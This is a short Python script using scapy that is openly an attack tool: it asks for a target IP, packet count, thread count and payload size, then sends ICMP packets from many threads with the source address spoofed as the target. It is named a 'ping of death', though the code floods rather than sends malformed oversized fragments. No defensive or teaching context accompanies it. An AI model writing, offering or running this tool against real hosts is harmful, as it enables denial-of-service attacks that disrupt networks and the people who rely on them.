from scapy.all import *
import threading
import os

def ping_of_death(target, num_packets, payload_size):
    payload = "X" * payload_size
    ip_hdr = IP(src=target, dst=target)
    icmp_hdr = ICMP()

    for _ in range(num_packets):
        try:
            packet = ip_hdr / icmp_hdr / payload
            send(packet, verbose=False)
        except Exception as e:
            print(f"Error sending packet: {e}")

def main():
    os.system("clear")
    target = input("Enter the target IP to attack: ")
    total_packets = int(input("Enter total number of packets: "))
    thread_count = int(input("How many threads: "))
    payload_size = int(input("Enter payload size (bytes): "))

    packets_per_thread = total_packets // thread_count
    remaining_packets = total_packets % thread_count

    threads = []
    for i in range(thread_count):
        packets_to_send = packets_per_thread + (1 if i < remaining_packets else 0)
        thread = threading.Thread(target=ping_of_death, args=(target, packets_to_send, payload_size))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("All attacks finished")

if __name__ == "__main__":
    main()
    print("Done")
